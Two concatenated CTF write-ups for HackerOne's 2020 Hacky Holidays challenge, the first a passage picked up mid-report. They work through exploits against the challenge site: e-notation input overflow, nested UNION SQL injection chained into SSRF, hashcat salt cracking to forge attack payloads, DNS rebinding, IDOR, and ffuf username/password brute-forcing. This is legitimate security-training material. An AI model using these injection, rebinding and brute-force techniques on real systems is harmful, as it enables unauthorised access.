31            if (strlen($lastname) < 3) {
32                $errors[] = 'Last name must by at least 3 characters';
33            }
34            if (!is_numeric($_POST["age"])) {
35                $errors[] = 'Age entered is invalid';
36            }
37            if (strlen($_POST["age"]) > 3) {
38                $errors[] = 'Age entered is too long';
39            }
40            $age = intval($_POST["age"]);
41            if (count($errors) === 0) {
42                $cookie = addUser($username, $password, $age, $firstname, $lastname);
43                setcookie('token', $cookie, time() + 3600);
44                header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
45                exit();
46            }
47        }
At first sight, there doesn't seem to be any way to coerce the application into giving us admin privileges - all inputs are being forced to specific lengths by either substr (username, firstname, lastname) followed by str_pad, by MD5 hashing (password), or by simple strlencheck (age).
The addUser function then ensures fixed length so that the final string entered into users.txt is exactly 113 in length. There is just one parameter that sticks out here - age.
While the page certainly ensures it is no longer than 3 in length, computers in general allow for expansion by using e notation - 1e3 will become 1000. PHP's is_numeric accepts this notation and it will later be expanded past the imposed length limit.
Knowing this, we can craft the following POST data in Burp and POST it to https://hackyholidays.h1ctf.com/signup-manager/:
Code 100 Bytes
1action=signup&
2username=ayayay&
3password=ayayay&
4age=1e3&
5firstname=ayayay&
6lastname=YYYYYYYYYYYYYYY
<image_49>
Do note, lastname's 15th character must be an uppercase Y. The 1e3 will expand into 1000 thus making the final string to enter users.txt:
ayayay#########8f74d2d878f454edb5dd310d198af797c4ca4238a0b923820dcc509a6f75849b1000ayayay#########YYYYYYYYYYYYYYY (or similar - the hash for session will differ)
<image_50>
We also receive a link to our next task - the 11th flag!
r3c0n_server_4fdk59/ - the 11th flag
Turns out the Grinch has been doing 'recon' on Santa's activities since 2018 and uploaded evidence of his criminal conduct to the internet. Tsk tsk.
<image_51>
<image_52>
The first page tells us there is an API in development but not much more. Fuzzing the url https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/ doesn't really much except confirming there is, in fact, an endpoint under api/:
Code 422 Bytes
1ffuf -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
2
3api/experiments         [Status: 401, Size: 64, Words: 9, Lines: 1] (false positive, hurr)
4api                     [Status: 200, Size: 2390, Words: 888, Lines: 54]
5picture                 [Status: 200, Size: 21, Words: 3, Lines: 1]
6uploads                 [Status: 403, Size: 145, Words: 3, Lines: 7]
<image_53>
It tells us there are a bunch of status codes but not much else... Fuzzing r3c0n_server_4fdk59/api/ gives us a whole lot of 401s - literally anything is a 401 under api/ - and just about nothing else... Well, it does tell us it's probably because we are coming from the wrong IP, so let's see if we can find some SSRF or other vulnerabilities.
Just for the sake of it, let's also run sqlmap on whatever we find.
Inspecting the first page with the album links tells us they point to album?hash=HASHVALUE example
Trying to decode the hashes gave nothing, so let's go ahead with sqlmap:
Code 191 Bytes
1sqlmap -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k --dbs
2[...]
3[14:52:35] [INFO] fetching database names
4available databases [2]:
5[*] information_schema
6[*] recon
So it's vulnerable, let's enumerate the recon database:
Code 226 Bytes
1sqlmap -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k -D recon --tables
2[...]
3[14:53:50] [INFO] fetching tables for database: 'recon'
4Database: recon
5[2 tables]
6+-------+
7| album |
8| photo |
9+-------+
Dumping them gives the following information:
Code 848 Bytes
1Database: recon
2Table: album
3[3 entries]
4+----+--------+-----------+
5| id | hash   | name      |
6+----+--------+-----------+
7| 1  | 3dir42 | Xmas 2018 |
8| 2  | 59grop | Xmas 2019 |
9| 3  | jdh34k | Xmas 2020 |
10+----+--------+-----------+
11
12Database: recon
13Table: photo
14[6 entries]
15+----+----------+--------------------------------------+
16| id | album_id | photo                                |
17+----+----------+--------------------------------------+
18| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
19| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |
20| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |
21| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |
22| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
23| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |
24+----+----------+--------------------------------------+
Hmm, nothing really interesting here. Let's have a look at how pictures are loaded.
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzliODgxYWY4YjMyZmYwN2Y2ZGFhZGE5NWZmNzBkYzNhLmpwZyIsImF1dGgiOiJlOTM0ZjQ0MDdhOWRmOWZkMjcyY2RiOWMzOTdmNjczZiJ9
Now that's more interesting! While the picture endpoint's data parameter doesn't seem to be vulnerable to SQLi, its contents look base64 encoded:
Code 169 Bytes
1atob(`eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzliODgxYWY4YjMyZmYwN2Y2ZGFhZGE5NWZmNzBkYzNhLmpwZyIsImF1dGgiOiJlOTM0ZjQ0MDdhOWRmOWZkMjcyY2RiOWMzOTdmNjczZiJ9`);
Code 127 Bytes
1{
2  "image":"r3c0n_server_4fdk59\/uploads\/9b881af8b32ff07f6daada95ff70dc3a.jpg",
3  "auth":"e934f4407a9df9fd272cdb9c397f673f"
4}
Sweet, looks like there might be some sort of SSRF and a leaked auth-hash! Also, we know uploaded pictures go in uploads/. Let's try to access some really common API endpoint, like api/user, right away!
Code 196 Bytes
1let e = btoa('{"image":"r3c0n_server_4fdk59\/api\/user","auth":"e934f4407a9df9fd272cdb9c397f673f"}');
2fetch(`/r3c0n_server_4fdk59/picture?data=${e}`).then(d => d.text()).then(d => console.log(d));
Wonder what nice stuff we'll get back now!
Code 27 Bytes
1invalid authentication hash
... I should have known. Seems like the auth part of the JSON object is used to check the contents of image. We can add any arbitrary properties we'd like to the JSON object, and as long as we don't fiddle with image and auth, the /picture endpoint will happily accept it.
* Several days of trying to figure out how the auth hash is encoded, hashed, encrypted etc later *
I got ... nothing. Let's go over the SQLi on the hash param - maybe we can influence the pictures displayed...
Looking back at the album and photo tables, the query is likely to select three columns so let's try with a UNION attack and see if we can get photos from 2020 without using the hash jdh34k. Since we know the album id is 3, we can construct the following SQLi:
Code 130 Bytes
1sql = `' union all select "3", 3, 'test' -- `;
2encodeURI(`https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=${sql}`);
<image_54>
Yup, we can fetch whatever album we'd like without using the hash. So what?
* Several hours spent trying to find ways to priv esc the database or random files through uploads/ later *
Back to the SQLi again. Maybe we can do a double union? I mean, we have found nothing else, and it's definitely fetching the pictures out of the database before displaying them. Let's see if we can construct an SQLi on the album id fetched from the database and affect the photo filename, the third column, loaded out of photos when the album page goes to load those from the DB:
Code 503 Bytes
1// this query assumes the /album first fetches the album id using hash
2// and then plugs that album id into a query to fetch any relevant photos
3// ie, the photo query's where statement becomes `album_id = 3' union select all 1, 2, 'waffle --
4// this in turn will give us another row fetched where the photo url will include waffle
5sql = `' union all select "3' union all select 1, 2, 'waffle -- ' -- ", 3, 'test' -- `;
6encodeURI(`https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=${sql}`);
Gives us this link https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash='%20union%20all%20select%20%223'%20union%20all%20select%201,%202,%20'waffle%20--%20'%20--%20%22,%203,%20'test'%20--%20 which includes a picture that can't be displayed!
Opening the link directly results in this:
<image_55>
The missing image link's data payload decodes to:
Code 241 Bytes
1atob("eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL3dhZmZsZSAtLSAiLCJhdXRoIjoiNGYwNzdlYjJhZDJmYzI3Y2Q5ZGVlMmJmZGE3NjNiZDcifQ==");
2"{
3  "image":"r3c0n_server_4fdk59\/uploads\/waffle -- ",
4  "auth":"4f077eb2ad2fc27cd9dee2bfda763bd7"
5}"
Following the link, we are presented with the following message:
<image_56>
Since it isn't a raw 404, it looks like picture really tried to read waffle from uploads. Apparently, the server has calculated the auth property for us and we have successfully achieved SSRF! Using the same method, let's see if we can access the API now by trying api/user again:
Code 172 Bytes
1sql = `' union all select "3' union all select 1, 2, '../api/user' -- ", 3, 'test' -- `;
2encodeURI(`https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=${sql}`);
<image_57>
Nope. Perhaps we need to specify a user? Let's try appending ?id=1
Code 177 Bytes
1sql = `' union all select "3' union all select 1, 2, '../api/user?id=1' -- ", 3, 'test' -- `;
2encodeURI(`https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=${sql}`);
<image_58>
Referencing the previous table for API status codes, id apparently isn't valid. Bah, let's fuzz it.
* Several hours of intense script writing later *
Armed with a node.js script, we can now automate visiting links and gathering data, thus enabling fuzzing. The script is nothing fancy and is basically the previously mentioned encoding combined with fetch, accessible from the command line for ease of use.
Fuzzing for parameters, I find that the user endpoint accepts username and password (and 0, which in hindsight probably is just the start of some other parameter I didn't find).
* Several hours spent passionately trying to brute-force username and password later *
Empty handed, I start looking for other endpoints and discover two more by fuzzing: ping and sleep. Both return Invalid content type when accessed through picture payloads. Huh. Normally at least the ping endpoint would return data - maybe the picture endpoint expects actual image data? None the wiser, I again go back through the recon challenge, checking for missed things. Not sure exactly why, but for some reason, my mind gets stuck on SQLi. Since we have already had two layers of SQLi, maybe there's another? Maybe we can extract a user by shoving a % in the username parameter, combining it with the error message (invalid content type) from picture? Might as well try!
<image_59>
* Intense script writing resumes - adding username and password brute-forcing to the script *
Letting the script run, it finally discovers that the username is likely to be grinchadmin and the password s4nt4sucks.
<image_60>
At long last, the 11th flag! But wait, the Grinch is going to DDoS Santa's servers (as we know) and his underlings have finished preparing the target setup!
attack-box/ - the 12th and final flag
Ooooookay, we need to stop this now. Before it's too late (hey, those buttons...). Need to protect Christmas (they look kinda nice)!
Maybe... No... I must click them!
<image_61>
Sorry Santa! Fortunately, it seems Santa's infrastructure isn't so easily overpowered (phew!).
So, how to go about this then... As one would guess, fuzzing gives nothing! Yup. No surprises there, not even coal. Let's have another look at those buttons (no touching!).
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
Apparently, they point to launch which accepts a base64 string through the payload parameter. Decoding the parameter gives us the following object:
Code 101 Bytes
1atob('eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==');
Code 74 Bytes
1{
2  "target":"203.0.113.33",
3  "hash":"5f2940d65ca4140cc18d0878bc398955"
4}
Great, another payload with another authentication hash. Maybe we can crack this one? Enter hashcat!
Code 771 Bytes
1Session..........: hashcat
2Status...........: Cracked
3Hash.Name........: md5($pass.$salt)
4Hash.Target......: 5f2940d65ca4140cc18d0878bc398955:203.0.113.33
5Time.Started.....: Tue Dec 29 22:44:30 2020 (0 secs)
6Time.Estimated...: Tue Dec 29 22:44:30 2020 (0 secs)
7Guess.Base.......: File (..\h1-xmas-ctf\rockyou.txt)
8Guess.Queue......: 1/1 (100.00%)
9Speed.#1.........: 17556.6 kH/s (5.91ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
10Recovered........: 1/1 (100.00%) Digests
11Progress.........: 5898240/14344385 (41.12%)
12Rejected.........: 0/5898240 (0.00%)
13Restore.Point....: 4915200/14344385 (34.27%)
14Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
15Candidates.#1....: omarsnork -> madruboisvert55
16Hardware.Mon.#1..: Temp: 41c Fan:  0% Util: 30% Core:1632MHz Mem:3802MHz Bus:16
Apparently, yes, yes we can.
Success was achieved first try by formatting a text file named hash2.txt like so:
Code 45 Bytes
15f2940d65ca4140cc18d0878bc398955:203.0.113.33
(curse you, hash.txt)
Then, we run hashcat like so:
Code 63 Bytes
1.\hashcat.exe -m 10 -a 0 .\hash2.txt ..\h1-xmas-ctf\rockyou.txt
The hash2.txt format along with options -m 10 -a 0 tells hashcat to try to turn the ip 203.0.113.33 into the hash 5f2940d65ca4140cc18d0878bc398955 by using a line from rockyou.txt and stuffing them together like so: md5(LINEFROMROCKYOU . '203.0.113.33').
We are quickly informed that the salt (pepper, actually) is mrgrinch463. Nice!
Using this, let's try our hand at creating a custom payload and see if we can change what the DDoS script attacks.
First, let's insert an IFRAME into the attack-box and give it the id frame - this way we can easily monitor what goes on in real time. I did this by opening the inspector and editing the first DIV inside the DIV with class container, though anywhere on the webpage should do.
<image_62>
Next, I entered this little snippet into the console:
Code 380 Bytes
1// copy and paste md5 from here http://www.myersdaily.org/joseph/javascript/md5.js into the console
2let lo = (load) => {
3    load = decodeURIComponent(load);
4    console.log("Running", load);
5    const hash = md5(`mrgrinch463${load}`);
6    const tar = `/attack-box/launch?payload=${btoa(`{"target":"${load}","hash":"${hash}"}`)}`;
7    document.getElementById("frame").src = tar;
8}
This let's us easily construct a new payload and load it into the IFRAME.
Let's try it with google as the target:
Code 17 Bytes
1lo("google.com");
<image_63>
Ah yes, we can create custom payloads with any target we'd like! (sorry google). Let's shut down localhost!
Code 16 Bytes
1lo("localhost");
<image_64>
...
Same thing for 127.0.0.1, hackyholidays.h1ctf.com, and so on. So there's some kind of protection for local targets in place... Hmm.
Running another domain, I noticed there was a slight delay between
Code 63 Bytes
1Getting Host information for: test.com
2Host resolves to x.x.x.x
and
Code 48 Bytes
1Spinning up botnet
2Launching attack against: ...
Just a few seconds, but probably enough time to perform a DNS Rebinding attack.
Let's do it!
I control my own domain, but it won't let me set the TTL to anything lower than 600 seconds, so the code below will reflect that.
First up, create a custom subdomain like hacky.example.com on a domain you own or through any service that lets you control TTL and destination. Point it to any IP that isn't 18.216.153.32, the IP of the CTF (and the Grinch's server). Set the TTL to 600 seconds.
Next, run a request against hacky.example.com and at the same time, initiate a timer to run a second request 598 seconds later (big maths incorporating load times, the alignment of the stars and what not).
Code 79 Bytes
1setTimeout(() => { lo("hacky.example.com") }, 598000);
2lo("hacky.example.com");
While waiting for the timer to run its course, leisurely change the DNS pointer for hacky.example.com to point to 127.0.0.1 and then grab a coffee or something. Take your time, brew it properly. Or a nice, warm cup of tea, as the Spiffing Brit would recommend. You might also take a moment to ponder what choices in life has led you to this point.
<image_65>
The 12th, and final, flag is flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}. The Grinch's server is down, Christmas has been saved, I get no coal, and maybe, just maybe, I can get that Snow Ball Launcher.
Shout outs
Big thanks to HackerOne, Adam, Naham for this CTF - looking forward to the next one!
Also shout outs to the people of HackerOne's discord who were very kind and helpful with hints and nudges for those of us stuck! I hope I can return the favour some day!
Impact
Lots of vulns!



==================================================

Report File: 1069335.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Information Disclosure

Contents:

<image_0>
Challenge I 🤖
"What are you doing?" I asked myself. I was about to trespass a clear warning to keep out.
<image_1>
"Have you lost your mind?" But I couldn't help it. I was born for this. And I wasn't going to back down. There are 12 more days until Christmas Eve, and I wasn't going to let a green furry dude destroy everything.
Let me backtrack a few days earlier. I minded my own business, prepping the Christmas tree on an old Elvis Presley album. I had planned holidays for my family and me, for a much-deserved getaway together.
Somehow I ended up on Twitter, just checking up on things from all my favorite hackers.
Suddenly my mood changed when I saw this tweet. This Grinch with his malefic little helper made an evil plan to destroy everything. Not just my holidays. Everyone's holidays!
<image_2>
I had to step up and stop it! I had to save Christmas! It is my duty!
Back to the present moment, I had to trespass the property to have a fighting chance. But there was nothing there, not a door or a crack on the wall.
I checked the robots.txt file for more clues. Luckily, the green beast left a trail.
Code 85 Bytes
1User-agent: *
2Disallow: /s3cr3t-ar3a
3Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
Web developers use this file to tell Web Crawlers what files/directories to avoid when indexing a website. Our friend here kept himself safe from these crawlers but instead leaked the path to finding him and his plan.
I solved the first riddle, but I will not rest. Not until I save the holy day!
Challenge II 🔎
<image_3>
11 days until Christmas!
The furry monster left a trail. I followed that path directly into a trap. It appears I have underestimated my enemy.
<image_4>
Is there nothing here to be found that could help me further? I took out my magnifying glass to inspect the elements. There must be a hint of where to look next!
<image_5>
I found the second flag, which brings me closer to saving the world!
"This isn't possible!" I exclaimed. I found the flag in DevTools, but I couldn't find it anywhere in the source code.
"How does it appear? What am I missing?" The only thing I haven't checked is the jquery.min.js file. But that couldn't be. That's a standard framework.
I had to look. And there it was, entirely hidden inside jQuery code.
Code 349 Bytes
1h1_0 = 'la';
2h1_1 = '}';
3h1_2 = '';
4h1_3 = 'f';
5h1_4 = 'g';
6h1_5 = '{b7ebcb75';
7h1_6 = '8454-';
8h1_7 = 'cfb9574459f7';
9h1_8 = '-9100-4f91-';
10document.getElementById('alertbox').setAttribute('data-info', h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1);
11document.getElementById('alertbox').setAttribute('next-page', '/ap' + 'ps');
The next step was clear now. This wasn't a trap, after all. At this point, I was starting to believe that the Grinch wanted to be found?! Maybe he doesn't want to be a mean person, after all. Perhaps it's a phase, and he needs some help. I was going to find out.
Challenge III - People Rater 📑
<image_6>
The Grinch is not stopping. And neither am I. There's this phone call from Taken that comes to mind:
I don't know who you are. I don't know what you want. If you are looking for ransom, I can tell you I don't have money, but what I do have are a very particular set of skills. Skills I have acquired over a very long career. Skills that make me a nightmare for people like you. If you let Santa Claus go now, that'll be the end of it. I will not look for you, I will not pursue you, but if you don't, I will look for you, I will find you, and I will save Christmas.
For today's challenge, the green thing has leaked his list of people that he hates with motivation for each one of them. Grinch and Santa Claus seem to be sharing habits.
I started analyzing the application. I'm struck by the fact that the list is so long! This list has 16 persons that may have done nothing wrong.
<image_7>
When clicking on a person, the application makes a GET JSON request to https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6Mn0=, with an ID for each person.
The ID is encoded in Base 64. Usually, to decode this, I use bash directly. Sometimes CyberChef for more complicated stuff. And lately, with the new Burp updates, the Inspector.
Code 42 Bytes
1> echo 'eyJpZCI6Mn0=' | base64 -d
2{"id":2}
Hmm! The decoded string contains the ID for the first person on the list, named Tea Avery. And the ID for the last person is 'eyJpZCI6MTd9' == b64('{"id":17}').
That raises some questions! Who has the number 1 ID? Let's send a request with the Burp Repeater. The encoded ID should be b64('{"id":1}') == 'eyJpZCI6MX0='.
<image_8>
I found him. Now some proper rest is required because tomorrow something more challenging will come.
Quick Note on Burp Suite: If you're starting in the Bug Bounty journey, my recommendation is to use the Burp Suite Community Edition until you get your first bounty that covers the cost of Burp Suite Pro. That's how I did. That's how many bug hunters I know have done it. Keep the costs low in the beginning. The Community Edition has all the features you need to get a jump start.
Challenge IV - Swag Shop 🛒🍪
<image_9>
Is this the next challenge? Because I really need a new Christmas hoodie.
<image_10>
Only 3 items in store for now. Nothing fancy in the source code. The application makes a get JSON request to /swag-shop/api/stock. I didn't find any parameters and no other items.
In moments like this, I pull out my little friend ffuf and start ramming at things. P.S. I do not recommend using as many threads as I am outside of CTF competitions. Always check the policy of the bounty program you are participating in.
I used the common.txt wordlist from SecLists. Now let me share a trick from my toolbox. It's pretty annoying to write the paths to wordlists so many times. But I also don't like to use a wrapper for directory busting because I want to take advantage of ffuf options. So I'm using variables in bash for the most used wordlists, and they're saved in .bashrc/.zshrc.
Code 1.06 KiB
1> export COMMONDIR="$HOME/tools/SecLists/Discovery/Web-Content/common.txt"
2> ffuf -u 'https://hackyholidays.h1ctf.com/swag-shop/FUZZ' -w $COMMONDIR -t 100 -c -mc all -fc 404
3
4        /'___\  /'___\           /____\
5       /\ \__/ /\ \__/  __  __  /\ \__/
6       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
7        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
8         \ \_\   \ \_\  \ \____/  \ \_\
9          \/_/    \/_/   \/___/    \/_/
10
11       v1.2.0-git
12________________________________________________
13
14 :: Method           : GET
15 :: URL              : https://hackyholidays.h1ctf.com/swag-shop/FUZZ
16 :: Wordlist         : FUZZ: /home/robert/tools/SecLists/Discovery/Web-Content/common.txt
17 :: Follow redirects : false
18 :: Calibration      : false
19 :: Timeout          : 10
20 :: Threads          : 100
21 :: Matcher          : Response status: all
22 :: Filter           : Response status: 404
23________________________________________________
24
25api                     [Status: 200, Size: 23, Words: 2, Lines: 1]
26:: Progress: [4661/4661] :: Job [1/1] :: 665 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
First, let's dive into the parameters I used for ffuf. My favorite is -c because it colorizes the output. The number of threads is set with -t.
And the magic happens with -mc all and -fc 404. I noticed that 404 is the status code for nonexisting directories/files on this application. This is very common. The parameter -fc 404 filters out any response with a 404 status code. Also, -mc all matches all status codes. I need this because, by default, ffuf matches only a handful of status codes.
Back to the grinching. I already found that /api endpoint. Maybe is something hidden there? Time for another ffuf.
Code 299 Bytes
1> ffuf -u 'https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ' -w $COMMONDIR -mc all -fc 404
2sessions                [Status: 200, Size: 2194, Words: 1, Lines: 1]
3stock                   [Status: 200, Size: 167, Words: 8, Lines: 1]
4user                    [Status: 400, Size: 35, Words: 3, Lines: 1]
I know /api/stock already. This is the one that's requested from the application page for the items.
What about /api/sessions? This one should be interesting.
Code 2.26 KiB
1> curl 'https://hackyholidays.h1ctf.com/swag-shop/api/sessions' | jq
2{
3  "sessions": [
4    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=",
5    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=",
6    "eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==",
7    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=",
8    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=",
9    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=",
10    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=",
11    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="
12  ]
13}
Base64 again. This seems to be a common thread with the evil Grinch. Just copy the JSON response to https://gchq.github.io/CyberChef/ and choose From Base64. That recipe will skip any non-base64 characters and decode the good ones. This helps the lazy ones like me.
In the decoding, each session is a JSON object with keys user and cookie. Each session has a cookie, but only one of them has a user key.
Code 242 Bytes
1{
2    "user": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
3    "cookie": "NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="
4}
Decoding the base64 from the cookie points to a hex string of 128 characters. Decoding the hex string results in binary data, so my guess is that's a hash.
This seems to be a dead-end, and I'm in a hurry to find the Grinch.
What about the /api/user endpoint?
Code 105 Bytes
1> curl 'https://hackyholidays.h1ctf.com/swag-shop/api/user' | jq
2{
3  "error": "Missing required fields"
4}
That's something. To find hidden parameters, I am using Arjun because it's speedy and has excellent visual effects.
Code 347 Bytes
1> cd ~/tools/Arjun
2> python3 arjun.py -u 'https://hackyholidays.h1ctf.com/swag-shop/api/user'
3    _
4   /_| _
5  (  |/ /(//) v2.0-beta
6      _/
7
8[*] Probing the target for stability
9[*] Analysing HTTP response for anomalies
10[*] Analysing HTTP response for potential parameter names
11[*] Logicforcing the URL endpoint
12[✓] name: uuid, factor: http code
It found the parameter uuid. I've seen a UUID before in the sessions. I tried it!
Code 365 Bytes
1> curl 'https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043' | jq
2{
3  "uuid": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
4  "username": "grinch",
5  "address": {
6    "line_1": "The Grinch",
7    "line_2": "The Cave",
8    "line_3": "Mount Crumpit",
9    "line_4": "Whoville"
10  },
11  "flag": "flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"
12}
<image_11>
I successfully doxed the big nasty green fluffy monster. He won't know what's coming! And I still want my hoodie.
Challenge V - Secure Login 🐏
<image_12>
I need to get inside the secret area. The application has a login page with username and password, and nothing more.
<image_13>
I tried directory bruteforcing, nothing was found. Tried parameters, got nothing again. Then I tried SQL Injection to bypass the authentication step. This is a really old school attack, but it didn't work...
Trying the login, I noticed that I am able to enumerate usernames. The error when trying anything is Invalid Username. This means I can possibly try bruteforcing usernames.
Let's get the good old ffuf out for this one. If you own a Burp Pro license, you can use the Intruder for this one. I recommend reading this excellent article at some point because the next command is going to be HUGE.
Code 385 Bytes
1> ffuf -u 'https://hackyholidays.h1ctf.com/secure-login' \
2    -w $HOME/tools/SecLists/Usernames/xato-net-10-million-usernames-dup.txt \
3    -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
4    -d 'username=FUZZ&password=test' \
5    -fr 'Invalid Username'
6
7access                  [Status: 200, Size: 1724, Words: 464, Lines: 37]
8[WARN] Caught keyboard interrupt (Ctrl-C)
Let's dive into this monster. I chose a big wordlist for usernames from SecLists. After I got a hit, I stopped ffuf from running. Hopefully, I will need only one username.
Now the cool part. I had to send a POST request with username and password. That's done by setting the method via -X parameter to POST. Then setting the Content-Type header to application/x-www-form-urlencoded with the -H parameter. Then setting the POST data to username=FUZZ&password=test. FUZZ is the magic word here.
And the last parameter, named Filter regexp, will filter out any response with Invalid Username.
I tried using the username found, only to be met with a new error.
<image_14>
I feel like I'm making progress here. Let's do the same thing, now for the password. And I chose the edgiest wordlist I could find for passwords!
Code 325 Bytes
1> ffuf -u 'https://hackyholidays.h1ctf.com/secure-login' \
2    -w $HOME/tools/SecLists/Passwords/darkweb2017-top1000.txt \
3    -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
4    -d 'username=access&password=FUZZ' \
5    -fr 'Invalid Password'
6
7computer                [Status: 302, Size: 0, Words: 1, Lines: 1]
